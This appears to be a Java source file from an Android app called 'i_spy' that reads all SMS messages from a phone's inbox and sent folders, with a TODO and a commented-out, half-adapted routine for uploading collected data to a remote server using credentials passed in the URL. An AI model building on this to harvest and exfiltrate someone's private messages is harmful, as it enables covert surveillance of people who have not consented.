package com.um.asn.i_spy.manager;


import android.content.Context;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.Uri;

import com.um.asn.i_spy.models.Message;
import com.um.asn.i_spy.models.Phone;

import java.util.ArrayList;

public class MessageManager {

    public Context context;
    public ConnectivityManager cm;
    public Phone phone;
    public ArrayList<Message> messages;

    public MessageManager(Context context, Phone phone) {
        this.context = context;
        this.phone = phone;
        this.cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        this.messages = new ArrayList<Message>();
    }

    public void run() {
        if (setMessages())
            return;//insertUpdate();
    }

    public boolean setMessages() {
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        if (cursor.moveToFirst()) {
            do {
                Message message = new Message(
                        cursor.getString(cursor.getColumnIndex("address")),
                        cursor.getInt(cursor.getColumnIndex("type")),
                        cursor.getInt(cursor.getColumnIndex("date")),
                        cursor.getString(cursor.getColumnIndex("body")),
                        this.phone,
                        cursor.getInt(cursor.getColumnIndex("_id"))
                );
                this.messages.add(message);
            } while (cursor.moveToNext());
        } else {
            System.out.println("NO MESSAGE INBOX");
        }

        Cursor cursor2 = context.getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
        if (cursor2.moveToFirst()) { // must check the result to prevent exception
            do {
                Message message = new Message(
                        cursor2.getString(cursor2.getColumnIndex("address")),
                        cursor2.getInt(cursor2.getColumnIndex("type")),
                        cursor2.getInt(cursor2.getColumnIndex("date")),
                        cursor2.getString(cursor2.getColumnIndex("body")),
                        this.phone,
                        cursor2.getInt(cursor2.getColumnIndex("_id"))
                );
                this.messages.add(message);
            } while (cursor2.moveToNext());
        } else {
            System.out.println("NO SENT");
        }
        return false;
    }

    // TODO :
    // 1. Récupérer tous les messages actuels
    // 2. Essayer de les envoyer sur le serveur, si fail save en local
    // 3. Listener sur messages reçus et messages envoyés, essayer envoyer sur serveur, si fail save en local
    // 4. Quand réseau dispo, envoyer les messages, et vider la base


    /*public void insertUpdate() {
        DatabaseHelper myBD = new DatabaseHelper(this.context);

        ArrayList<Contact> contactToUpdate = new ArrayList<Contact>();
        ArrayList<Contact> contactToInsert = new ArrayList<Contact>();
        for (Message message : this.messages) {
            Contact contactBD = myBD.getByIdRefContact(message.getIdRef());
            if (contactBD != null) {
                try {
                    if (!contact.isSame(contactBD)) {
                        contactToUpdate.add(contact);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            } else {
                contactToInsert.add(contact);
            }
        }

        System.out.println("Nombre de contacts : " + this.messages.size());
        System.out.println("Nombre de nouveaux contacts : " + contactToInsert.size());
        System.out.println("Nombre de contacts à mettre à jour : " + contactToUpdate.size());

        NetworkInfo networkInfo = this.cm.getActiveNetworkInfo();
        if (networkInfo != null && networkInfo.isConnected()) {

            JSONArray jaI = new JSONArray();
            for (Contact c : contactToInsert) {
                JSONObject joI = new JSONObject();
                try {
                    joI.put("nom", c.getNom());
                    joI.put("numero", c.getNumero());
                    joI.put("idRef", c.getIdRef());
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                jaI.put(joI);
            }

            JSONArray jaU = new JSONArray();
            for (Contact c : contactToUpdate) {
                JSONObject joU = new JSONObject();
                try {
                    joU.put("nom", c.getNom());
                    joU.put("numero", c.getNumero());
                    joU.put("idRef", c.getIdRef());
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                jaU.put(joU);
            }

            try {
                String urlI = Config.SERVER_DOMAIN + "contacts";
                urlI += "?phone[login]=" + phone.getLogin() + "&phone[password]=" + phone.getPassword();
                JSONObject resultI = new JSONObject((String) new HttpPostTask().execute(new Object[]{urlI, jaI.toString()}).get());

                if ((boolean) resultI.get("success")) {
                    System.out.println("Contact saved dist");
                    for (Contact c : contactToInsert) {
                        myBD.insertContact(c);
                    }
                }

                String urlU = Config.SERVER_DOMAIN + "phone/" + phone.getId() + "/contacts";
                urlU += "?phone[login]=" + phone.getLogin() + "&phone[password]=" + phone.getPassword();
                JSONObject resultU = new JSONObject((String) new HttpPutTask().execute(new Object[]{urlU, jaU.toString()}).get());

                if ((boolean) resultU.get("success")) {
                    System.out.println("Contact update dist");
                    for (Contact c : contactToUpdate) {
                        myBD.updateByIdRefContact(c.getIdRef(), c);
                    }
                }
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (ExecutionException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }

    public void insertLocal() {
        DatabaseHelper myBD = new DatabaseHelper(this.context);
        myBD.insertContact(this.messages.get(0));
        System.out.println("Contact saved local (" + myBD.getAllContact().size() + ")");
    }*/

}
